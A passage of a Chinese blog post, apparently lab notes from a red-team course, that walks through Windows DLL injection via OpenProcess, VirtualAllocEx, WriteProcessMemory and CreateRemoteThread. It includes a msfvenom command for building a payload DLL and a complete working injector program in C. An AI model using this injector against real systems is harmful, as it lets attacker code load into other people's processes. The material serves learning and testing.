#E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ProcessID</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic"> // 返回比对成功的 PID</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">entry)); </span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 存储进程 PID</span></span><span class="line"><span style="color: #ABB2BF">DWORD processId </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(processName);</span></span></code></pre></div></div></figure><p>第二步，枚举出 PID 后，我们需要打开进程。这可以通过多种 Windows API 调用实现： <code>GetModuleHandle</code> 、 <code>GetProcAddress</code> 或 <code>OpenProcess</code> 。</p><p>第三步，必须为提供的恶意 DLL 分配内存。与大多数注入器一样，这可以通过 <code>VirtualAllocEx</code> 来完成。</p><p>第四步，我们需要将恶意 DLL 写入已分配的内存位置。我们可以使用 <code>WriteProcessMemory</code> 来写入已分配的区域。</p><p>这里我不太理解为什么前面分配内存的时候不 + 1，按理说分配的大小要超过能写入的大小吧，这里写入的大小都超过分配内存区域的大小了，难道不报错？</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 通过 PID 获取进程的句柄</span></span><span class="line"><span style="color: #ABB2BF">HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, processId);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 在目标进程的地址空间中给 DLL 分配内存，返回一个指针地址</span></span><span class="line"><span style="color: #ABB2BF">LPVOID dllAllocatedMemory </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath),</span><span style="color: #7F848E; font-style: italic"> // DLL 路径文本本身的大小</span></span><span class="line"><span style="color: #ABB2BF">MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT, PAGE_EXECUTE_READWRITE</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 写入内存</span></span><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hProcess,</span></span><span class="line"><span style="color: #ABB2BF">dllAllocatedMemory,</span><span style="color: #7F848E; font-style: italic"> // 分配内存区域的指针</span></span><span class="line"><span style="color: #ABB2BF">dllLibFullPath,</span><span style="color: #7F848E; font-style: italic"> // 恶意 DLL 的路径</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 确保字符后面的 \0 也写入进去</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>最后，我们使用 <code>CreateRemoteThread</code> 在目标进程中创建一个新线程。该线程的<strong>起始地址</strong>指向 <code>kernel32.dll</code> 中的 <code>LoadLibraryA</code> 函数，并将我们写入的 DLL 路径作为<strong>参数</strong>传递给它。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">LPVOID loadLibrary </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (LPVOID) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 包含需要调用的 API 的模块的句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">&quot;LoadLibraryA&quot;</span><span style="color: #7F848E; font-style: italic"> // 要导入的 API 调用</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">HANDLE remoteThreadHandler </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hProcess, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 使用线程的默认堆栈大小</span></span><span class="line"><span style="color: #ABB2BF">(LPTHREAD_START_ROUTINE) loadLibrary</span><span style="color: #7F848E; font-style: italic"> // 指向 API 起始函数的指针</span></span><span class="line"><span style="color: #ABB2BF">dllAllocatedMemory,</span><span style="color: #7F848E; font-style: italic"> // 指向分配好内存区域的指针</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 创建后立即执行</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>说实话有点折腾人了，这里由于 ANSI 和 Unicode 的问题弄了很久。两套兼容方式也够折磨人的，不愧是 <del>Microshit</del>。</p><p>前面 <code>GetProcessId</code> 方法那里，<code>Process32First</code> 只给了一种实现，用的是 Unicode 编码，即 <code>wchar_t</code> 类型。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#ifdef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UNICODE</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF"> Process32FirstW</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF"> Process32NextW</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PROCESSENTRY32</span><span style="color: #ABB2BF"> PROCESSENTRY32W</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PPROCESSENTRY32</span><span style="color: #ABB2BF"> PPROCESSENTRY32W</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LPPROCESSENTRY32</span><span style="color: #ABB2BF"> LPPROCESSENTRY32W</span></span><span class="line"><span style="color: #C678DD">#endif</span><span style="color: #7F848E; font-style: italic">  // !UNICODE</span></span></code></pre></div></div></figure><p>从内存视图里面可以看到从结构体里面获取的字符串都高位有一个 \00，这是 UTF-16 的特性。而我们传入的 <code>processName</code> 又是 ANSI 编码的，这就会导致 strcmp 返回不了正确的结果。</p><img src="/thm_rthe/image-20250822080345228.png" class="" title="image-20250822080345228"><img src="/thm_rthe/image-20250822080402484.png" class="" title="image-20250822080402484"><p>所以这里要写一个函数，把 ANSI 字符串转换为 <code>wchar_t</code> 类型。</p><p>好，这里解决了，下面有一个 <code>GetFullPathName</code> 方法，这个函数呢，有两种版本。但默认情况下，Visual Studio 项目是配置为 <strong>Unicode</strong> 的。这意味着 <code>GetFullPathName</code> 实际上调用的是 <code>GetFullPathNameW</code>。这下就导致 <code>dllLibFullPath</code> 接收到的是一个 <code>wchar_t</code> 类型，而系统又是把他当成 <code>char</code> 来对待。我 debug 的时候就发现他输出一个字符就不输出了。不过这里用 <code>GetFullPathNameA</code> 就解决了。</p><p>后面导入 <code>LoadLibrary</code> 方法的时候，要用 <code>GetModuleHandleA</code> ，至此解决了所有问题，可以注入 DLL 了。</p><p>解决这个的过程要善用调试工具，折腾这一下把 VS Studio 调试熟悉了。</p><p>如果你想通过调试查看 DLL 是否加载进程序了，通过 VS Studio 这个 Debug 是不够的，因为我们是注入到目标程序里面了，所以那一块的内存区域要用其他方式去读取。</p><p>用到的 DLL 是 msfvenom 生成的，你可以用以下代码生成 DLL。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=&quot;calc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dll</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc.dll</span></span></code></pre></div></div></figure><p>以下是我修改好的 dll-injector：</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;tlhelp32.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;string.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;wchar.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 将 ANSI 字符串转换为宽字符</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这是一个简单的辅助函数</span></span><span class="line"><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">AnsiToWideChar</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">ansiStr</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> len </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MultiByteToWideChar</span><span style="color: #ABB2BF">(CP_ACP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ansiStr, </span><span style="color: #C678DD">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> wideStr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF">malloc</span><span style="color: #ABB2BF">(len </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">wchar_t</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MultiByteToWideChar</span><span style="color: #ABB2BF">(CP_ACP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ansiStr, </span><span style="color: #C678DD">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, wideStr, len);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> wideStr;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">DWORD </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">processName</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(TH32CS_SNAPPROCESS, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hSnapshot) {</span></span><span class="line"><span style="color: #ABB2BF">        PROCESSENTRY32 entry;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PROCESSENTRY32);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">entry)) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> wideProcessName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">AnsiToWideChar</span><span style="color: #ABB2BF">(processName);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">//printf(&quot;%s\n&quot;, processName);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">//wprintf(L&quot;%s\n&quot;, entry.szExeFile);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">strcmp</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">szExeFile</span><span style="color: #ABB2BF">, wideProcessName)) {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Found!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ProcessID</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">entry));</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">) {</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (argc </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Cannot find require parameters</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Usage: dll-injector.exe &lt;process name&gt; &lt;path to DLL&gt;</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dllLibFullPath</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">256</span><span style="color: #ABB2BF">];</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    LPCSTR processName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">    LPCSTR dllLibName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">];</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    DWORD processId </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(processName);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;processId: </span><span style="color: #D19A66">%d</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">)processId);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">processId) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ProcessId Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">GetFullPathNameA</span><span style="color: #ABB2BF">(dllLibName, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(dllLibFullPath), dllLibFullPath, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;GetFullPathName Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, processId);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hProcess </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hProcess Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    LPVOID dllAllocatedMemory </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath), MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (dllAllocatedMemory </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;dllAllocatedMemory Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(hProcess, dllAllocatedMemory, dllLibFullPath, </span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath) </span><span style="color: #C678DD">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;WriteProcessMemory Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    LPVOID loadLibrary </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (LPVOID)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">GetModuleHandleA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #98C379">&quot;LoadLibraryA&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    HANDLE remoteThreadHandler </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)loadLibrary, dllAllocatedMemory, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (remoteThreadHandler </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;remoteThreadHandler Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span 